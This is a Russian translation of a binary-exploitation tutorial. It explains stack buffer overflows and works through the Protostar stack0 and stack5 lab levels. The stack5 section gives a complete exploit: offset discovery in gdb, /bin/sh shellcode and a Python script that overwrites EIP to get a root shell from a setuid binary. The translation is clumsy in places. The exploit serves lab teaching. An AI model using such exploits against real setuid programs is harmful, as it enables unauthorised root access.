

Источник: https://0xrick.github.io
Ссылка:  https://0xrick.github.io/binary-exploitation/bof1/

Прежде всего, я пишу это, чтобы помочь всем, кто хочет узнать об атаках с переполнением буфера, основы понимания этого могут сбивать с толку, и мне потребовалось некоторое время, чтобы понять это самому, поэтому я расскажу некоторые основы в этой статье, я собираюсь поговорить о том, что такое буфер, что такое стек и каковы адреса памяти, и мы рассмотрим структуру памяти приложения, что такое переполнение буфера и почему это происходит, тогда я покажите действительно простой и простой пример переполнения буфера (protostar stack0)

# Двоичная эксплуатация — подробное объяснение переполнения буфера

## Буфер

Итак, что такое буфер? Просто буфер — это место или место в памяти, которое используется работающей программой. Эта ячейка памяти используется для хранения некоторых временных данных, используемых программой. Так, например, если у нас есть простая программа, которая просит пользователя ввести свое имя и сохраняет его в переменной с именем _username_ , тогда она печатает «Hello _username_ ». Например, если мы запустим программу и введем имя пользователя как «Рик». Слово «Рик» сохраняется в буфере до тех пор, пока программа не выполнит команду печати и не извлечет данное имя пользователя «Рик» из буфера для вывода результата: «Привет, Рик».

Наш пример, написанный на c, будет таким

```c
#include <stdio.h>

int main () {
   char username[20];

   printf("Enter your name: ");
   scanf("%s", username);

   printf("Hello %s\n", username);
   
   return(0);
}
```

Авария :  
`int main()` Это определяет основную функцию  
`char username[20]` Здесь мы указываем имя переменной, но самое главное в этой строке `char .... [20]`здесь мы указываем буфер для этой переменной, и я назначил его как 20 символов  
Остальная часть кода принимает пользовательский ввод, а затем печатает его.  

```c
printf("Enter your name: ");  
scanf("%s", username);
printf("Hello %s\n, username");
```

Итак, когда мы скомпилируем и запустим эту программу, мы получим ожидаемый результат, верно?

![[Pasted image 20230614034218.png]]

Теперь, прежде чем мы поговорим о переполнении буфера, нам нужно понять, как работает память приложения.

## Память приложений, стек и адреса памяти 

Так как же выглядит память приложения и что такое стек? Стек — это буфер памяти, который используется для хранения функций программы и локальных переменных. Чтобы продемонстрировать это, мы рассмотрим это изображение.

![[Pasted image 20230614034309.png]]

Сначала у нас есть код, а это исходный код программы. Это основные инструкции программы. После этого у нас есть буфер, в котором хранятся глобальные переменные,  _Разница между локальной переменной и глобальной переменной заключается в том, что локальная переменная ограничена определенной функцией. Он определен в этой функции и может быть вызван только в этой функции, но глобальная переменная либо определена в основной функции, либо определена вне функции, и этот тип переменных может быть вызван где угодно_ .  
Затем у нас есть стек, и это важная часть памяти для нас, потому что именно здесь происходит переполнение буфера. Это место, где хранятся локальные переменные и вызовы функций.  И последнее — куча, и это динамическое выделение памяти. Теперь мы знаем, как выглядит память приложения и что такое стек, но что такое адреса памяти?  

В основном, когда программа компилируется и выполняется, все инструкции программы выполняются в памяти приложения, и им присваивается адрес. Этот адрес обычно имеет формат шестнадцатеричных байтов. 

Итак, если вы разберете программу и посмотрите на нее, вы найдете адреса памяти, что-то вроде этого:

![[Pasted image 20230614034418.png]]
## Почему происходит переполнение буфера?

Теперь мы знаем, что такое буфер, и более подробно рассмотрели конструкцию памяти. Теперь вы, возможно, уже поняли, почему и когда происходит переполнение буфера. Переполнение буфера происходит, когда длина введенных данных превышает предел буфера, и это заставляет программу записывать данные за пределами выделенной области буфера и может перезаписывать некоторые части памяти, которые использовались для хранения данных, используемых программой, что делает ее недоступной. и вызывает сбой программы. Чтобы продемонстрировать это, вернемся к нашему первому примеру.  

```c
#include <stdio.h>

int main () {
   char username[20];

   printf("Enter your name: ");
   scanf("%s", username);

   printf("Hello %s\n", username);
   printf("Program exited normally");
   return(0);
}
```

Мы добавим последнюю строку, чтобы напечатать предложение «программа завершилась нормально» только в демонстрационных целях.  
Теперь программа должна запросить у нас имя пользователя, затем напечатать «Привет, _имя пользователя_ », затем напечатать «программа завершилась нормально» и выйти. Буфер для хранения значения имени пользователя установлен на 20 символов, это хорошо, если длина имени пользователя меньше 20 символов. Но если введенные данные имеют длину более 20 символов, программа рухнет, потому что некоторые данные будут перезаписаны вне буфера, что приведет к повреждению некоторых частей программы. в нашем случае это будет та часть, которая печатает «программа завершилась нормально».  
Сначала запустим программу и введем имя как Rick

![[Pasted image 20230614034501.png]]

Программа завершается нормально.  
Теперь давайте запустим его снова и введем имя как 30 A's.

![[Pasted image 20230614034525.png]]

Мы получаем «Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa», тогда мы не видим «программа, выходящая нормально», и мы получаем ошибку ошибки сегментации. Это произошло потому, что мы ввели 10 дополнительных символов, а программа ожидала только 20 или меньше. Эти дополнительные «AAAAAAAAAA» превысили буфер из 20 символов и перезаписали другие данные (инструкцию печати, которая печатает «программа завершилась нормально»), что вызвало ошибку сегментации, поскольку программа повреждена.

## Проверка переполнения буфера с помощью [[BA. GDB | gdb]]

Давайте подробнее рассмотрим, как это происходит с gdb (отладчиком gnu).  
Мы напишем еще одну программу, которая создает переменную с именем «что угодно», затем копирует то, что мы ей даем, и помещает в эту переменную. И мы назначим буфер для этой переменной равным 20.

```c
#include <stdio.h>
#include <string.h>

int main(int argc, char** argv)
{
	char whatever[20];
	strcpy(whatever, argv[1]);

	return 0;
}
```

Авария :  
`int main(int argc, char** argv)`Это определяет основную функцию и ее аргументы  
`char whatever[20];`Это создает переменную и дает ей имя «независимо» и присваивает ее буферу значение 20.  
`strcpy(whatever, argv[1]);`Это копирует наш ввод и помещает его в нашу переменную «независимо».

Теперь давайте запустим программу внутри gdb и протестируем ее.

![[Pasted image 20230614034647.png]]

Ввод был aaaaa, что составляет менее 20 символов, поэтому программа завершилась нормально, и все в порядке.  
Теперь давайте добавим ввод более 20 символов.

![[Pasted image 20230614034710.png]]

Мы получаем ошибку сегментации, потому что наш адрес возврата перезаписан, и программа не может продолжать работу.  
Чтобы показать, как перезаписываются эти адреса, давайте введем любое шестнадцатеричное значение, например, \x12 50 раз. Тогда давайте посмотрим на регистры.

![[Pasted image 20230614034735.png]]

Мы видим, что большая часть адресов памяти перезаписана с 12

## Чем опасно переполнение буфера? 

Теперь вы можете спросить себя, как это будет вредно?  
Переполнение буфера опасно, когда уязвимый двоичный файл или программа являются двоичными [файлами setuid](https://en.wikipedia.org/wiki/Setuid) . Если вы не знаете, что такое двоичные файлы setuid, прочитайте предоставленную ссылку, но в целом это программы, которые запускаются с возможностями другого пользователя (обычно root), Но когда эта программа уязвима для переполнения буфера, это уже нехорошо. Поскольку мы можем передать буфер и перезаписать программу, мы можем перезаписать ее полезной нагрузкой, которая выполняет системный вызов и порождает корневую оболочку.

Я еще буду писать о переполнении буфера и других техниках эксплуатации бинарных файлов, а пока начну с protostar.  
На Hack The box также есть несколько крутых ящиков, которые требовали переполнения буфера и использования бинарных файлов для получения привилегий суперпользователя, но они активны прямо сейчас, поэтому я, конечно, опубликую свои записи об этих ящиках, как только они уйдут на пенсию. А пока вы можете прочитать другие мои [рецензии на Hack The Box](https://0xrick.github.io) !


## Protostar Stack0 

Теперь давайте сделаем простой практический пример.  
Вы можете скачать протостар [отсюда](https://www.vulnhub.com/entry/exploit-exercises-protostar-v2,32/)  

В этой статье я решу первый уровень, который называется stack0, а остальные уровни решу в других статьях.  
Нам дан исходный код программы:

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
 volatile int modified;
 char buffer[64];

 modified = 0;
 gets(buffer);

 if(modified != 0) {
  printf("you have changed the 'modified' variable\n");
 } else {
  printf("Try again?\n");
 }
}
```

Из кода мы можем понять, что программа имеет переменную с именем «буфер» и присваивает ей буфер из 64 символов. Затем есть еще одна переменная, называемая модифицированной, и ее значение равно 0. gets(buffer) позволяет нам ввести значение переменной «buffer». Затем есть оператор if, который проверяет, не равно ли значение «модифицированной» переменной 0. Если он не равен нулю, он напечатает «вы изменили «измененную» переменную», но если он по-прежнему равен 0, он напечатает «Попробовать еще раз?». Итак, наша миссия состоит в том, чтобы изменить значение этой переменной, называемой «модифицированной».  

Пока введенные данные меньше 64 символов, все будет работать, как задумано. Но если вход превышает буфер, он перезапишет значение «модифицированной» переменной.  

Мы уже знаем, что буфер составляет 64 символа, поэтому нам просто нужно ввести 65 или более символов, и значение переменной изменится. Давайте проверим это.  
Мы запускаем bin stack0 и видим вывод «попробовать еще раз?»

![[Pasted image 20230614034921.png]]

Давайте накинем 65 «А» и посмотрим на результат  `python -c "print ('A' * 65)" | ./stack0`  :

![[Pasted image 20230614035005.png]]

И мы успешно перезаписали значение переменной! :D

---


# Примеры переполнения буфера, выполнение кода путем внедрения шеллкода

Мы, наконец, повысим привилегии с помощью уязвимого двоичного файла suid (вы можете узнать больше об этом, прочитав [первую статью о переполнении буфера](https://0xrick.github.io/binary-exploitation/bof1/) ). также будут рассмотрены некоторые интересные темы, чтобы полностью понять этот эксплойт. Это также самый реалистичный на данный момент эксплойт. Все предыдущие эксплойты хотели, чтобы мы изменили переменную, выполнили функцию ... вещи, которые больше похожи на CTF, но на этот раз у нас реалистичная ситуация. Не теряя больше времени, давайте сразу перейдем к делу.  

Прочтите [предыдущие статьи](https://0xrick.github.io/categories) сначала , если вы еще этого не сделали.

![[Pasted image 20230614051026.png]]

## ./Stack5

У нас есть источник, как и во всех предыдущих испытаниях, но на этот раз это на самом деле не важно.  

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
 char buffer[64];

 gets(buffer);
}
```

Он просто берет наш ввод и сохраняет его в буфере, он даже не говорит нам о размере буфера. Как насчет `char buffer[64];`? например [, stack4,](https://0xrick.github.io/binary-exploitation/bof4/) если мы попробуем 64 символа, он даже не рухнет. с учетом сказанного начнем.  
Как всегда, мы начнем с выяснения, уязвим ли двоичный файл или нет (да, мы уже это знаем, но это важный этап перечисления). `python -c "print 'A' * 100" | ./stack5`

![[Pasted image 20230615030435.png]]

Ошибка сегментации. Итак, он падает до 100 символов, следующий шаг - узнать, где именно он падает. Мы будем использовать метасплоит `pattern_create`и `pattern_offset`, я объяснил как это работает в [stack3](https://0xrick.github.io/binary-exploitation/bof3) `./pattern_create.rb -l 100`  

![[Pasted image 20230615030517.png]]

Затем мы запустим gdb и создадим точку останова в `main()`, `run`программу после точки останова мы продолжаем, а затем передаем наш шаблон:

```
break main
run
c
```

![[Pasted image 20230615030537.png]]

Он падает в `0x63413563`, теперь будем использовать `pattern_offset` `./pattern_offset.rb -q 63413563`

![[Pasted image 20230615030554.png]]

И мы получаем точное совпадение по смещению 76. Как я уже говорил, мы будем использовать этот двоичный файл, чтобы получить корневую оболочку, но как узнать, является ли это двоичным файлом suid или нет? мы можем просто использовать `find`знать, что `find /opt/protostar/bin/ -perm -4000 | grep stack5`

![[Pasted image 20230615030613.png]]

И мы получаем `/opt/protostar/bin/stack5`, если бы это не был двоичный файл suid, мы бы не получили никакого вывода. Если вы просто ищете двоичные файлы suid, вы можете удалить `grep`команда, и она выведет список всех двоичных файлов suid в указанном каталоге.  

## Развлечение с gdb, поиск EIP 

Теперь давайте снова запустим gdb и начнем получать полезную информацию. Прежде чем мы начнем, я должен сказать, что адреса памяти могут отличаться, поэтому мой не будет таким же, как ваш. В прошлый раз мы перезаписали адрес EIP адресом `win()`функция . На этот раз у нас нет функции для выполнения, мы должны найти адрес EIP и сделать так, чтобы он указывал на наш «злой ввод» (шеллкод), я объясню через мгновение.  
Мы установим аромат разборки на Intel `set disassembly-flavor intel` Затем разберем основную функцию `disassemble main`

![[Pasted image 20230615030706.png]]

Глядя на это, мы можем определить лучшее место для установки нашей точки останова, и это будет до `leave`инструкция , `leave`находится прямо перед `return`инструкция, рядом `leave`мы видим адрес `0x080483d9`поэтому мы будем набирать: `break *0x080483d9`

![[Pasted image 20230615030724.png]]

Затем мы запустим программу и передадим любой ввод, много A всегда хорошо.

![[Pasted image 20230615030735.png]]

Он выполнится и остановится в точке останова, набрав `info frame`мы можем получить адрес EIP `info frame`

![[Pasted image 20230615030749.png]]

Последние 2 строки показывают сохраненные регистры: eip at `0xbffff77c`

## Другой способ получить размер буфера [Постоянная ссылка](https://0xrick.github.io/binary-exploitation/bof5/#another-way-to-get-the-buffer-size "Постоянная ссылка")

Давайте сделаем перерыв и быстро рассмотрим еще один способ получить размер буфера, я хотел показать это быстро, потому что мы уже сделали 50% этого.  

Metasploit — это круто, но что, если в какой-то ситуации у нас его нет? Мы можем сделать это вручную, рассчитав расстояние между начальным адресом буфера и адресом EIP. Мы уже получили адрес EIP, поэтому давайте получим начало буфера.  
Если мы напечатаем `x/24wx $esp`нам покажет( `x/`) 24 ( `24wx`) слова в верхней части стека ( `$esp`).  
`x/24wx $esp`

![[Pasted image 20230615030805.png]]

Во второй строке мы видим этот адрес `0xbffff730`и он содержит значения `0x41414141`и мы уже знаем, что 41 — это шестнадцатеричная буква «А», которая была нашим входом в программу, поэтому мы знаем, что этот адрес — это место, где начинается буфер. Мы знаем, что сначала идет буфер, а затем EIP, поэтому адрес EIP больше, чем адрес буфера. Вычтем их друг из друга: `p/d 0xbffff77c - 0xbffff730`

![[Pasted image 20230615030832.png]]

И мы получаем 76, тот же результат, что и при использовании metasploit. Это был еще один практичный способ узнать размер буфера.  

## Идея эксплойта

прежде чем мы создадим наш эксплойт, давайте просто поймем идею эксплойта. мы заполним буфер «A» как всегда, мы достигнем EIP и перезапишем его новым адресом, который указывает на наш шелл-код (через 4 байта), затем мы добавим что-то под названием NOP (No Operation), затем, наконец шеллкод. Разложим все.  

## ShellCode 

Так что же такое шеллкод? Просто это кусок кода (написанный в шестнадцатеричном формате в нашей ситуации), который мы используем в качестве полезной нагрузки для выполнения чего-то. `/bin/sh`например. И этот двоичный файл suid … поэтому, если мы запустим шелл-код, который выполняет `/bin/sh`с бинарником мы получим корневую оболочку.  

Достать шеллкоды можно из [shell-storm](http://shell-storm.org/shellcode/) или [изexploit-db](https://www.exploit-db.com/) , конечно есть куча других ресурсов, я просто привожу примеры.  
Это [шеллкод](https://www.exploit-db.com/exploits/13357) , который мы собираемся использовать для этой задачи:

```
\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
```

Этот шелл-код выполняется `/bin/sh`

## NOP (Нет операции)

По сути, никакая операция не используется, чтобы убедиться, что наш эксплойт не сработает, потому что мы не всегда указываем на правильный адрес, поэтому мы добавляем вещи, которые ничего не делают, и указываем на них. Затем, когда программа их выполняет достигнет этих NOP и продолжит их выполнение (ничего не делает), пока не достигнет шелл-кода.  

## Создание эксплойта

В последних задачах это решил один оператор печати Python. На этот раз будет беспорядок, поэтому мы создадим небольшой эксплойт с помощью python.  

Первым делом мы импортируем модуль с именем struct , я сейчас объясню почему.  
`import struct` Затем мы создадим переменную, которая будет содержать заполнение (символы для заполнения буфера). `pad = "\x41" * 76` После того, как он заполнит буфер, он попадет в EIP, нам нужен новый адрес EIP, который мы назначим, как я сказал выше, нам нужно, чтобы он был адресом следующей инструкции (4 байта после исходного адреса EIP), поэтому он будет `0xbffff77c + 4`, Google может просто дать вам ответ: D. это будет `0xbffff780`. Мы добавим это значение в переменную, но помните, что оно нам нужно в обратном порядке. Вот почему структура важна. если ты сделаешь `import struct;struct.pack("I" , 0xbffff780)`из интерпретатора python он напечатает `\x80\xf7\xff\xbf`, это облегчает жизнь :D  
`EIP = struct.pack("I", 0xbffff780)`  
Затем идет наш шеллкод

```python
shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"`
```

И последнее, это NOP, это может быть что угодно, поэтому 100 символов будет хорошо.  
`NOP = "\x90" * 100`  
Хорошо, наш эксплойт готов, нам просто нужно распечатать финальную полезную нагрузку, так что:  
`print pad + EIP + NOP + shellcode`  
Давайте посмотрим на сценарий:

```python
import struct
pad = "\x41" * 76
EIP = struct.pack("I", 0xbffff780)
shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
NOP = "\x90" * 100
print pad + EIP + NOP + shellcode
```

![[Pasted image 20230615031041.png]]

## Применение эксплойта

Теперь пришло время шоу! давайте проверим это.  
`python /tmp/stack5.py | ./stack5`

![[Pasted image 20230615031104.png]]

И мы получили корневую оболочку!

